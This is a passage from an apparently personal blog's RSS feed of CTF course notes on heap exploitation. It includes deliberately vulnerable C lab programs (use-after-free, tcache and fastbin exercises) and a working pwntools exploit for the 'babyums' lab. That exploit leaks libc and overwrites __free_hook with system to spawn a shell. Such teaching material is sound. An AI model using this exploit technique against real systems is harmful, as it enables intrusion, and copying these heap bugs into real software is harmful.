&lt;img src="https://imgur.com/h9ibSyk.png" alt="" />&lt;/p></description></item><item><title>Simple PWN - 0x15(Lab - `heapmath`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/</guid><description>&lt;h1 id="simple-pwn---0x15lab---heapmath">
 Simple PWN - 0x15(Lab - &lt;code>heapmath&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x15lab---heapmath">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;time.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);
 srand(time(NULL));

 void *tcache_chk[7] = {0};
 unsigned char tcachebin[3][7] = {0}; // 0x20, 0x30, 0x40
 unsigned int tcachebin_counts[4] = {0};
 unsigned long tcache_size[7] = {0};
 unsigned long tcache_free_order[7] = {0};

 puts(&amp;#34;----------- ** tcache chall ** -----------&amp;#34;);
 unsigned long tmp = 0;
 for (int i = 0; i &amp;lt; 7; i++) {
 tmp = (rand() % 0x21) + 0x10; // 0x10 ~ 0x30
 tcache_size[i] = tmp;
 }

 for (int i = 0; i &amp;lt; 7; i++) {
 repeat:
 tmp = rand() % 7;
 for (int j = 0; j &amp;lt; i; j++)
 if (tmp == tcache_free_order[j]) goto repeat;
 tcache_free_order[i] = tmp;
 }

 for (int i = 0; i &amp;lt; 7; i++) {
 tcache_chk[i] = malloc( tcache_size[i] );
 printf(&amp;#34;char *%c = (char *) malloc(0x%lx);\n&amp;#34;, &amp;#39;A&amp;#39; + i, tcache_size[i]);
 }

 for (int i = 0; i &amp;lt; 7; i++) {
 int idx = tcache_free_order[i];
 free(tcache_chk[ idx ]);
 printf(&amp;#34;free(%c);\n&amp;#34;, &amp;#39;A&amp;#39; + (unsigned char) idx);

 tmp = tcache_size[ idx ] - 0x8;
 if (tmp % 0x10)
 tmp = (tmp &amp;amp; ~0xf) + 0x20;
 else
 tmp += 0x10;

 unsigned int binidx = ((tmp - 0x20) / 0x10);
 unsigned int bincnt = tcachebin_counts[ binidx ];
 tcachebin[ binidx ][ bincnt ] = &amp;#39;A&amp;#39; + (unsigned char) idx;
 tcachebin_counts[ binidx ]++;
 }

 char tmpbuf[0x100] = {0};
 char ansbuf[3][0x100] = {0};
 for (int i = 0; i &amp;lt; 3; i++) {
 for (int j = 6; j &amp;gt;= 0; j--)
 if (tcachebin[i][j]) {
 sprintf(tmpbuf, &amp;#34;%c --&amp;gt; &amp;#34;, tcachebin[i][j]);
 strcat(ansbuf[i], tmpbuf);
 }
 strcat(ansbuf[i], &amp;#34;NULL&amp;#34;);
 }
 puts(&amp;#34;&amp;#34;);
 for (int i = 0; i &amp;lt; 3; i++) {
 printf(&amp;#34;[chunk size] 0x%x: &amp;#34;, (i+2) * 0x10);
 if (i == 0) {
 printf(&amp;#34;%s\t(just send \&amp;#34;%s\&amp;#34;)\n&amp;#34;, ansbuf[i], ansbuf[i]);
 } else {
 printf(&amp;#34;?\n&amp;gt; &amp;#34;);
 fgets(tmpbuf, 0x100, stdin);
 if (!strncmp(tmpbuf, ansbuf[i], strlen(ansbuf[i]))) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: \&amp;#34;%s\&amp;#34;\n&amp;#34;, ansbuf[i]);
 exit(0);
 }
 }
 }

 puts(&amp;#34;\n----------- ** address chall ** -----------&amp;#34;);
 int cmp1 = 0;
 int cmp2 = 0;
 unsigned long ans_addr = 0;

 cmp1 = rand() % 7;
 while ((cmp2 = rand() % 7) == cmp1);
 if (cmp1 &amp;gt; cmp2) {
 tmp = cmp1;
 cmp1 = cmp2;
 cmp2 = tmp;
 }

 printf(&amp;#34;assert( %c == %p );\n&amp;#34;, &amp;#39;A&amp;#39; + cmp1, tcache_chk[ cmp1 ]);
 printf(&amp;#34;%c == ?\t(send as hex format, e.g. \&amp;#34;%p\&amp;#34;)\n&amp;gt; &amp;#34;,
 &amp;#39;A&amp;#39; + cmp2, tcache_chk[ cmp1 ]);
 scanf(&amp;#34;%s&amp;#34;, tmpbuf);
 ans_addr = strtoul(tmpbuf, NULL, 16);

 if (ans_addr == (unsigned long) tcache_chk[ cmp2 ]) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: %p\n&amp;#34;, tcache_chk[ cmp2 ]);
 exit(0);
 }

 puts(&amp;#34;\n----------- ** index chall ** -----------&amp;#34;);
 unsigned long *fastbin[2] = {0};
 unsigned long fastbin_size = 0;
 unsigned long secret_idx = 0, result_idx = 0, res = 0;

 fastbin_size = (rand() % 0x31) + 0x40; // 0x40 ~ 0x70
 fastbin_size &amp;amp;= ~0xf;
 fastbin[0] = (unsigned long *) malloc( fastbin_size );
 fastbin[1] = (unsigned long *) malloc( fastbin_size );
 
 printf(&amp;#34;unsigned long *%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;X&amp;#39;, fastbin_size);
 printf(&amp;#34;unsigned long *%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;Y&amp;#39;, fastbin_size);

 secret_idx = rand() % (fastbin_size / 8);
 fastbin[1][ secret_idx ] = 0xdeadbeef;
 result_idx = ((unsigned long)(&amp;amp;fastbin[1][ secret_idx ]) - (unsigned long)(&amp;amp;fastbin[0][0])) / 8;
 
 printf(&amp;#34;Y[%lu] = 0xdeadbeef;\n&amp;#34;, secret_idx);
 printf(&amp;#34;X[?] == 0xdeadbeef\t(just send an integer, e.g. \&amp;#34;8\&amp;#34;)\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%lu&amp;#34;, &amp;amp;res);

 if (fastbin[0][res] == 0xdeadbeef) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: %lu\n&amp;#34;, result_idx);
 exit(0);
 }

 puts(&amp;#34;\n----------- ** tcache fd chall ** -----------&amp;#34;);
 free(fastbin[0]);
 free(fastbin[1]);
 printf(&amp;#34;free(X);\nfree(Y);\nassert( Y == %p );\n&amp;#34;, fastbin[1]);
 printf(&amp;#34;fd of Y == ?\t(send as hex format, e.g. \&amp;#34;%p\&amp;#34;)\n&amp;gt; &amp;#34;, fastbin[1]);
 scanf(&amp;#34;%s&amp;#34;, tmpbuf);
 ans_addr = strtoul(tmpbuf, NULL, 16);

 if (ans_addr == *fastbin[1]) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: 0x%lx\n&amp;#34;, *fastbin[1]);
 exit(0);
 }

 puts(&amp;#34;\n----------- ** fastbin fd chall (final) ** -----------&amp;#34;);
 puts(&amp;#34;[*] Restore the chunk to X and Y&amp;#34;);
 printf(&amp;#34;%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;Y&amp;#39;, fastbin_size);
 printf(&amp;#34;%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;X&amp;#39;, fastbin_size);
 fastbin[1] = malloc(fastbin_size);
 fastbin[0] = malloc(fastbin_size);
 printf(&amp;#34;[*] Do something to fill up 0x%lx tcache\n...\n[*] finish\n&amp;#34;, fastbin_size + 0x10);
 void *tmpchk[7];
 for (int i = 0; i &amp;lt; 7; i++)
 tmpchk[i] = malloc(fastbin_size);
 for (int i = 0; i &amp;lt; 7; i++)
 free(tmpchk[i]);
 printf(&amp;#34;free(X);\nfree(Y);\nassert( Y == %p );\n&amp;#34;, fastbin[1]);
 free(fastbin[0]);
 free(fastbin[1]);
 printf(&amp;#34;fd of Y == ?\t(send as hex format, e.g. \&amp;#34;%p\&amp;#34;)\n&amp;gt; &amp;#34;, fastbin[1]);
 scanf(&amp;#34;%s&amp;#34;, tmpbuf);
 ans_addr = strtoul(tmpbuf, NULL, 16);

 if (ans_addr == *fastbin[1]) {
 puts(&amp;#34;Correct !&amp;#34;);
 memset(tmpbuf, 0, 0x31);
 
 int fd = open(&amp;#34;/home/heapmath/flag&amp;#34;, O_RDONLY);
 read(fd, tmpbuf, 0x30);
 close(fd);
 printf(&amp;#34;Here is your flag: %s\n&amp;#34;, tmpbuf);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: 0x%lx\n&amp;#34;, *fastbin[1]);
 exit(0);
 }
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x16(simple_smallbin)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/</guid><description>&lt;h1 id="simple-pwn-0x16simple_smallbin">
 Simple PWN 0x16(simple_smallbin)
 &lt;a class="anchor" href="#simple-pwn-0x16simple_smallbin">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://imgur.com/teWNhbh.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://imgur.com/kCTN7cs.png" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 void *ptrs[7];
 void *smallbin;
 int i;

 for (i = 0; i &amp;lt; 7; i++)
 ptrs[i] = malloc(0x108); // 0x110 chunk size

 smallbin = malloc(0x108);
 malloc(0x18);

 // aim to fill up tcache
 while(i)
 free(ptrs[--i]);
 
 free(smallbin);
 // trigger unsorted bin dispatch
 malloc(0x870);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x17(UAF - leak information)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/</guid><description>&lt;h1 id="simple-pwn-0x17uaf---leak-information">
 Simple PWN 0x17(UAF - leak information)
 &lt;a class="anchor" href="#simple-pwn-0x17uaf---leak-information">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="uaf-backgroud">
 UAF backgroud
 &lt;a class="anchor" href="#uaf-backgroud">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/MwjSNFQIx0c">SS111-Pwn2&lt;/a>
&lt;a href="https://youtu.be/rMqvL9j0QaM?t=3009">Advanced Binary Exploitation (Pwn) - Heap Exploitation&lt;/a>
&lt;img src="https://imgur.com/nFDhGiC.png" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 void *p1, *p2;
 p1 = malloc(0x30);
 p2 = malloc(0x30);

 free(p1);
 free(p2);

 puts(p2);
}
&lt;/code>&lt;/pre>&lt;p>If we set the pointer to &lt;code>NULL&lt;/code> after it was freed, then we can get some vital info. from this chunk.&lt;/p></description></item><item><title>Simple PWN 0x18(Lab - `babynote`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/</guid><description>&lt;h1 id="simple-pwn-0x18lab---babynote">
 Simple PWN 0x18(Lab - &lt;code>babynote&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn-0x18lab---babynote">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>hook - &lt;a href="https://youtu.be/MwjSNFQIx0c?t=838">SS111-Pwn2&lt;/a>
&lt;img src="https://imgur.com/lx8zR2J.png" alt="" />
&lt;a href="https://blog.xuite.net/peterlee.tw/twblog/112094832">Hook簡介&lt;/a>
&lt;a href="https://www.google.com/url?sa=t&amp;amp;rct=j&amp;amp;q=&amp;amp;esrc=s&amp;amp;source=web&amp;amp;cd=&amp;amp;cad=rja&amp;amp;uact=8&amp;amp;ved=2ahUKEwjIxp70jeL8AhUjQPUHHde8BDcQFnoECA4QAQ&amp;amp;url=https%3A%2F%2Fxtutlab.blogspot.com%2F2018%2F10%2Fhook-function.html&amp;amp;usg=AOvVaw26FwxmT40uQgIsFIlbjs2k">Hook Function (攔截函式)&lt;/a>&lt;/li>
&lt;li>The process of free and priority
Assume we malloc a memory with size over &lt;font color="FF0000">&lt;code>0x410&lt;/code>&lt;/font>, then when we free it, it&amp;rsquo;ll be classified to &lt;font color="FF0000">&lt;code>Unsorted bin&lt;/code>&lt;/font> instead of &lt;code>tcache&lt;/code>
&lt;img src="https://imgur.com/kCTN7cs.png" alt="" />
&lt;img src="https://imgur.com/u2Wy9xw.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

struct Note
{
 char name[0x10];
 void *data;
};

struct Note *notes[0x10];

static short int get_idx()
{
 short int idx;

 printf(&amp;#34;index\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;idx);

 if (idx &amp;gt;= 0x10)
 printf(&amp;#34;no, no ...\n&amp;#34;), exit(1);
 
 return idx;
}

static short int get_size()
{
 short int size;

 printf(&amp;#34;size\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;size);
 
 return size;
}

void add_note()
{
 short int idx;

 idx = get_idx();
 notes[idx] = malloc(sizeof(*notes[idx]));

 printf(&amp;#34;note name\n&amp;gt; &amp;#34;);
 read(0, notes[idx]-&amp;gt;name, 0x10);

 notes[idx]-&amp;gt;data = NULL;
 printf(&amp;#34;success!\n&amp;#34;);
}

void edit_data()
{
 short int idx;
 short int size;

 idx = get_idx();
 size = get_size();

 if (notes[idx]-&amp;gt;data == NULL)
 notes[idx]-&amp;gt;data = malloc(size);
 
 read(0, notes[idx]-&amp;gt;data, size);
 printf(&amp;#34;success!\n&amp;#34;);
}

void del_note()
{
 short int idx;

 idx = get_idx();
 free(notes[idx]-&amp;gt;data);
 free(notes[idx]);
 printf(&amp;#34;success!\n&amp;#34;);
}

void show_notes()
{
 for (int i = 0; i &amp;lt; 0x10; i++) {
 if (notes[i] == NULL || notes[i]-&amp;gt;data == NULL)
 continue;
 
 printf(&amp;#34;[%d] %s\ndata: %s\n&amp;#34;, i, notes[i]-&amp;gt;name, (char *)notes[i]-&amp;gt;data);
 }
}

int main()
{
 char opt[2];

 setvbuf(stdin, NULL, _IONBF, 0);
 setvbuf(stdout, NULL, _IONBF, 0);

 while (1)
 {
 printf(&amp;#34;1. add_note\n&amp;#34;
 &amp;#34;2. edit_data\n&amp;#34;
 &amp;#34;3. del_note\n&amp;#34;
 &amp;#34;4. show_notes\n&amp;#34;
 &amp;#34;5. bye\n&amp;#34;
 &amp;#34;&amp;gt; &amp;#34;);
 read(0, opt, 2);

 switch (opt[0]) {
 case &amp;#39;1&amp;#39;: add_note(); break;
 case &amp;#39;2&amp;#39;: edit_data(); break;
 case &amp;#39;3&amp;#39;: del_note(); break;
 case &amp;#39;4&amp;#39;: show_notes(); break;
 case &amp;#39;5&amp;#39;: exit(0);
 }
 }
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x19(Lab - `babyums` - flag 1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/</guid><description>&lt;h1 id="simple-pwn-0x19lab---babyums---flag-1">
 Simple PWN 0x19(Lab - &lt;code>babyums&lt;/code> - flag 1)
 &lt;a class="anchor" href="#simple-pwn-0x19lab---babyums---flag-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#define FLAG1 &amp;#34;flag{XXXXXXXX}&amp;#34;

struct User
{
 char name[0x10];
 char password[0x10];
 void *data;
};

struct User *users[8];

static short int get_idx()
{
 short int idx;

 printf(&amp;#34;index\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;idx);

 if (idx &amp;gt;= 8)
 printf(&amp;#34;no, no ...&amp;#34;), exit(1);
 
 return idx;
}

static short int get_size()
{
 short int size;

 printf(&amp;#34;size\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;size);

 if (size &amp;gt;= 0x500)
 printf(&amp;#34;no, no ...&amp;#34;), exit(1);
 
 return size;
}

void add_user()
{
 short int idx;

 idx = get_idx();
 users[idx] = malloc(sizeof(*users[idx]));

 printf(&amp;#34;username\n&amp;gt; &amp;#34;);
 read(0, users[idx]-&amp;gt;name, 0x10);

 printf(&amp;#34;password\n&amp;gt; &amp;#34;);
 read(0, users[idx]-&amp;gt;password, 0x10);

 users[idx]-&amp;gt;data = NULL;
 printf(&amp;#34;success!\n&amp;#34;);
}

void edit_data()
{
 short int idx;
 short int size;

 idx = get_idx();
 size = get_size();

 if (users[idx]-&amp;gt;data == NULL)
 users[idx]-&amp;gt;data = malloc(size);
 
 read(0, users[idx]-&amp;gt;data, size);
 printf(&amp;#34;success!\n&amp;#34;);
}

void del_user()
{
 short int idx;

 idx = get_idx();
 free(users[idx]-&amp;gt;data);
 free(users[idx]);
 printf(&amp;#34;success!\n&amp;#34;);
}

void show_users()
{
 for (int i = 0; i &amp;lt; 8; i++) {
 if (users[i] == NULL || users[i]-&amp;gt;data == NULL)
 continue;
 
 printf(&amp;#34;[%d] %s\ndata: %s\n&amp;#34;, i, users[i]-&amp;gt;name, (char *)users[i]-&amp;gt;data);
 }
}

void add_admin()
{
 users[0] = malloc(sizeof(*users[0]));
 strcpy(users[0]-&amp;gt;name, &amp;#34;admin&amp;#34;);
 strcpy(users[0]-&amp;gt;password, FLAG1);
 users[0]-&amp;gt;data = NULL;
}

int main()
{
 char opt[2];
 int power = 20;

 setvbuf(stdin, NULL, _IONBF, 0);
 setvbuf(stdout, NULL, _IONBF, 0);

 printf(&amp;#34;**** User Management System ****\n&amp;#34;);
 add_admin();

 while (power)
 {
 power--;
 printf(&amp;#34;1. add_user\n&amp;#34;
 &amp;#34;2. edit_data\n&amp;#34;
 &amp;#34;3. del_user\n&amp;#34;
 &amp;#34;4. show_users\n&amp;#34;
 &amp;#34;5. bye\n&amp;#34;
 &amp;#34;&amp;gt; &amp;#34;);
 read(0, opt, 2);

 switch (opt[0]) {
 case &amp;#39;1&amp;#39;: add_user(); break;
 case &amp;#39;2&amp;#39;: edit_data(); break;
 case &amp;#39;3&amp;#39;: del_user(); break;
 case &amp;#39;4&amp;#39;: show_users(); break;
 case &amp;#39;5&amp;#39;: exit(0);
 }
 }
 printf(&amp;#34;No... no power..., b..ye...\n&amp;#34;);
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x20(Lab - `babyums` - flag 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/</guid><description>&lt;h1 id="simple-pwn-0x20lab---babyums---flag-2">
 Simple PWN 0x20(Lab - &lt;code>babyums&lt;/code> - flag 2)
 &lt;a class="anchor" href="#simple-pwn-0x20lab---babyums---flag-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/2bR8lalySvKfA7Zr8DOhuA">Simple PWN 0x19(Lab - &lt;code>babyums&lt;/code> - flag 1)&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Very similar in this article: &lt;a href="https://bernie6401.github.io/zj3FTgxZQ22EgRPn1KHUSg">0x18(Lab - &lt;code>babynote&lt;/code>)&lt;/a>
:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

# r = process(&amp;#39;./chal&amp;#39;)
r = remote(&amp;#39;edu-ctf.zoolab.org&amp;#39;, 10008)

context.arch = &amp;#39;amd64&amp;#39;

def add_user(idx, user_name, user_passwd):
 r.sendafter(b&amp;#39;&amp;gt; &amp;#39;, b&amp;#39;1&amp;#39;)
 r.sendlineafter(b&amp;#39;index\n&amp;gt; &amp;#39;, str(idx))
 r.sendafter(b&amp;#39;username\n&amp;gt; &amp;#39;, user_name)
 r.sendafter(b&amp;#39;password\n&amp;gt; &amp;#39;, user_passwd)

def edit_data(idx, note_size, message):
 r.sendafter(b&amp;#34;&amp;gt; &amp;#34;, b&amp;#34;2&amp;#34;)
 r.sendlineafter(b&amp;#39;index\n&amp;gt; &amp;#39;, str(idx))
 r.sendlineafter(b&amp;#39;size\n&amp;gt; &amp;#39;, str(note_size))
 r.send(message)

def del_user(idx):
 r.sendafter(b&amp;#34;&amp;gt; &amp;#34;, b&amp;#34;3&amp;#34;)
 r.sendlineafter(b&amp;#39;index\n&amp;gt; &amp;#39;, str(idx))

def show_user():
 r.sendafter(b&amp;#34;&amp;gt; &amp;#34;, b&amp;#34;4&amp;#34;)


&amp;#39;&amp;#39;&amp;#39;------------------
Construct heap memory
------------------&amp;#39;&amp;#39;&amp;#39;
add_user(0, b&amp;#39;a&amp;#39;*8, b&amp;#39;aaaa&amp;#39;)
edit_data(0, 0x418, b&amp;#39;a&amp;#39;)

add_user(1, b&amp;#39;b&amp;#39;*8, b&amp;#39;bbbb&amp;#39;)
edit_data(1, 0x18, b&amp;#39;b&amp;#39;)

add_user(2, b&amp;#39;c&amp;#39;*8, b&amp;#39;cccc&amp;#39;)

&amp;#39;&amp;#39;&amp;#39;------------------
Leak libc address
------------------&amp;#39;&amp;#39;&amp;#39;
del_user(0)
show_user()
r.recvuntil(b&amp;#39;data:&amp;#39;)
libc = (u64(r.recv(8)) &amp;gt;&amp;gt; 8) - 0x1ecbe0 - 0xa000000000000
info(f&amp;#34;libc address: {hex(libc)}&amp;#34;)
free_hook_addr = libc + 0x1eee48
info(f&amp;#34;__free_hook address: {hex(free_hook_addr)}&amp;#34;)
libc_sys_addr = libc + 0x52290
info(f&amp;#34;__libc_system address: {hex(libc_sys_addr)}&amp;#34;)

&amp;#39;&amp;#39;&amp;#39;------------------
Construct fake chunk
------------------&amp;#39;&amp;#39;&amp;#39;
data = b&amp;#39;/bin/sh\x00&amp;#39;.ljust(0x10, b&amp;#39;b&amp;#39;)
fake_chunk = flat(
 0, 0x31,
 b&amp;#39;cccccccc&amp;#39;, b&amp;#39;cccccccc&amp;#39;,
 b&amp;#39;cccccccc&amp;#39;, b&amp;#39;cccccccc&amp;#39;,
 free_hook_addr
)

edit_data(1, 0x48, data + fake_chunk)
edit_data(2, 0x8, p64(libc_sys_addr))
del_user(1)

r.interactive()
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x21(fopen, fread, fwrite, fclose)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/</guid><description>&lt;h1 id="simple-pwn-0x21fopen-fread-fwrite-fclose">
 Simple PWN 0x21(fopen, fread, fwrite, fclose)
 &lt;a class="anchor" href="#simple-pwn-0x21fopen-fread-fwrite-fclose">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler fopen&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
 FILE *fp;
 fp = fopen(&amp;#34;./test&amp;#34;, &amp;#34;r&amp;#34;);
 fclose(fp);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;p>:::spoiler fread&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
 FILE *fp;
 char buf[0x10];

 fp = fopen(&amp;#34;./test&amp;#34;, &amp;#34;r&amp;#34;);
 fread(buf, 0x1, 0x10, fp);
 fclose(fp);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;p>:::spoiler fwrite&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
 FILE *fp;
 char buf[0x10] = &amp;#34;TEST!!&amp;#34;;

 fp = fopen(&amp;#34;./test_write&amp;#34;, &amp;#34;r&amp;#34;);
 fread(buf, 0x1, 0x10, fp);
 fclose(fp);

 return 0;
}
